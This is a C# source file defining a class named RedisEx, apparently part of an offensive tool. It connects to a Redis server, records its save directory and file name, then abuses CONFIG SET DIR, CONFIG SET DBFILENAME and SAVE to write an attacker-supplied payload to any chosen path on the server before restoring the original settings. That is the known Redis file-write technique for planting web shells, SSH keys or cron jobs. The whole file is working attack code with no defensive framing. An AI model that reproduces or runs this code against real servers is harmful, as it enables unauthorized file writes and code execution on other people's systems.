using System;
using System.Text;
using StackExchange.Redis;

public class RedisEx
{
	private ConnectionMultiplexer redis;
    private string content = "";
    private string filename ="", filepath="";
    private string oldfilepath="",oldfilename= "";
    public RedisEx(String host,int port, String password)
	{
        this.redis = ConnectionMultiplexer.Connect(host+":"+port+ ",password="+password);
    }

    public void setPayload(String content)
    {
        this.content = "\n" + content + "\n";
    }


    public void setFilename(String filename)
    {
        this.filepath = Path.GetDirectoryName(filename).Replace("\\", "/");
        this.filename = Path.GetFileName(filename);
    }
    public string Attack()
    {
        try
        {
            IDatabase db = redis.GetDatabase(0);
            RedisResult exeRes = db.Execute("CONFIG", "SET", "DIR", this.filepath);
            exeRes = db.Execute("CONFIG", "SET", "DBFILENAME", this.filename);
            exeRes = db.Execute("SET", RandomStringGenerator.GetRandomString(8), this.content);
            exeRes = db.Execute("SAVE");
            // 还原原本的redis路径
            exeRes = db.Execute("CONFIG", "SET", "DIR", this.oldfilepath);
            exeRes = db.Execute("CONFIG", "SET", "DBFILENAME", this.oldfilename);
            exeRes = db.Execute("SAVE");
            return exeRes.ToString();
        }
        catch(Exception ex)
        {
            return ex.Message;
        }
    
    }

    public (bool,string) Check()
    {
        try
        {
            IDatabase db = redis.GetDatabase();
            RedisResult info = db.Execute("INFO");
            RedisResult dir = db.Execute("CONFIG", "GET", "DIR");
            RedisResult name = db.Execute("CONFIG", "GET", "DBFILENAME");
            if (dir != null)
            {
                var result = (RedisResult[])dir; // 将结果转换为 RedisResult 数组
                this.oldfilepath = result[1].ToString();
            }
            if (name != null)
            {
                var result1 = (RedisResult[])name;
                this.oldfilename = result1[1].ToString();
            }
            return (true, info.ToString());
        }
        catch(RedisConnectionException ex)
        {
            return (false, ex.Message);
        }
        catch (Exception ex)
        {
            // 捕获其他异常
            return (false, ex.Message);
        }

    }

}

public class RandomStringGenerator
{
    private static Random random = new Random();

    public static string GetRandomString(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        StringBuilder stringBuilder = new StringBuilder();

        for (int i = 0; i < length; i++)
        {
            stringBuilder.Append(chars[random.Next(chars.Length)]);
        }

        return stringBuilder.ToString();
    }
}
